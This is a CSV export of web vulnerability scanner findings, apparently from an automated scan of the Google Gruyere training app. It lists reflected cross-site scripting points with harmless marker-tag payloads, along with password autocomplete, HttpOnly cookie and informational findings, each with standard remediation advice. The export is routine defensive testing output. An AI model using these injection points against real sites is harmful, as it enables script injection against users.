asset.id,asset.name,"definition.cvss2.base_score","definition.cvss2.base_vector","definition.cvss3.base_score","definition.cvss3.base_vector",definition.description,definition.family,definition.id,definition.name,"definition.patch_published","definition.plugin_published","definition.plugin_updated",definition.references,definition.see_also,definition.severity,definition.solution,"definition.vulnerability_published",finding_id,first_observed,last_observed,output,risk_modified,severity,state
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"00294dcf-55f7-4079-b10a-75188d349d66",2022-03-15T21:06:17.432Z,2022-03-15T15:27:50Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/resetbutton/656501648683287335357107855369111942818 with input fields : 
- g-recaptcha-response (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/resetbutton/656501648683287335357107855369111942818",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Provides scan information and statistics of plugins run.",General,98000,"Scan Information",,2017-03-31T00:00:00Z,2017-03-31T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"01a076e6-6cd7-4d04-b739-8f8af19ceebe",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"
Engine Version      1.24.0-575
Scan ID             798cc6ee-419f-40b1-b710-59cb8e5c7325

Start Time          2022-03-15 16:42:35 +0000
Duration            02:00:02

Requests            116241
Crawler Requests    17668
Requests/s          23.584
Mean Response Time  0.5426s

Bandwidth Usage
- Data to Target    55.1 MB
- Data from Target  263 MB

Timeouts Encountered
Network Timeouts    775
Browser Timeouts    0

Browser Respawns    0

HTTP Protocols Detected
- HTTP
- HTTPs


Authentication Identified
- None


Plugins
- 364 have been included per scan policy
- 304 have been started based on target information collected

List of plugins is available in 'plugins.csv' attachment.


Settings used to conduct this scan are available in 'configuration.csv' attachment.
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"02250bc4-ba6e-42a3-8968-8c5b1b82adbc",2022-03-15T18:42:41.743Z,2022-03-15T17:00:39Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl?uid=cheddar' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"02927c4f-4a7d-409a-8dcb-e22d7b5856df",2022-03-15T18:42:41.743Z,2022-03-15T16:59:56Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"A Security.txt file has not been detected on the target.

When security risks in web services are discovered by independent security researchers, this file defines the channels to disclose them properly & enables 3rd party researchers to disclose issues securely in a manner defined by the organization.

Organizations should consider creating a security.txt file containing contact and other information in the defined format and place it under the .well-known directory of the server.","Web Servers",112723,"Security.txt File Not Detected",,2021-03-17T00:00:00Z,2021-03-17T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://securitytxt.org/, https://tools.ietf.org/html/draft-foudil-securitytxt-11",Info,,,"02ea5d49-181d-4406-a877-e8eb06aac0c6",2022-03-15T18:42:41.743Z,2022-03-15T16:44:49Z,"No or a malformed security.txt was found at http://google-gruyere.appspot.com/.well-known/security.txt",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"030cc841-6c65-4733-9225-fe9202974eab",2022-03-15T21:06:17.432Z,2022-03-15T19:58:11Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/656501648683287335357107855369111942818/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"03956c83-eb3d-4fc7-a533-29f14d17b702",2022-03-15T21:06:17.432Z,2022-03-15T14:00:35Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP PUT request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"04bb9495-e014-4511-87b3-469b98740745",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'https://google-gruyere.appspot.com/start'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0550aeb5-c864-44e1-8a6d-b598f263f884",2022-03-15T21:06:17.432Z,2022-03-15T14:01:13Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"05c98643-c5d0-41b5-94df-416766e019ee",2022-03-15T21:06:17.432Z,2022-03-15T17:14:27Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"081c279d-5eb2-4826-8b88-920431d06fdc",2022-03-15T21:06:17.432Z,2022-03-15T13:36:05Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"09474a38-0bec-4d33-bd6a-86a8e33731f5",2022-03-15T21:06:17.432Z,2022-03-15T13:36:05Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0960a027-6da8-4dfa-865b-353e11439510",2022-03-15T21:06:17.432Z,2022-03-15T14:24:53Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"09a5111e-5568-438c-8e4d-55a702926e44",2022-03-15T21:06:17.432Z,2022-03-15T16:41:46Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0a24f3e3-7b26-4639-ad59-ba9c707f34cb",2022-03-15T21:06:17.432Z,2022-03-15T15:30:32Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/login' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"0aa12d86-6230-45db-b713-a79fc60ab11b",2022-03-15T18:42:41.743Z,2022-03-15T18:04:15Z,"On https://google-gruyere.appspot.com/ debug error messages were detected. Please see the attached response for full details.
<b>WARNING:</b> Accessing or attacking a computer system without authorization is illegal in many jurisdictions. While doing this codelab",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"0c404afb-b8fd-4dc3-a4bd-183f3e2e9efe",2022-03-15T21:06:17.432Z,2022-03-15T19:01:48Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""update"">
  </input>
  <input type=""text"" value="""" name=""name"" maxlength=""16"">
  </input>
  <input type=""password"" name=""oldpw"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""text"" value="""" name=""icon"">
  </input>
  <input type=""text"" size=""50"" value="""" name=""web_site"">
  </input>
  <input type=""text"" value="""" name=""color"">
  </input>
  <textarea name=""private_snippet"" rows=""10"" style=""width:100%"">
  </textarea>
  <input type=""submit"" value=""Update"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"0e10bffd-bf73-48b9-b2a2-0e745ebf854b",2022-03-15T18:42:41.743Z,2022-03-15T17:38:44Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl with input fields : 
- private_snippet (no type specified)
- action (hidden)
- name (text)
- oldpw (password)
- pw (password)
- icon (text)
- web_site (text)
- color (text)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
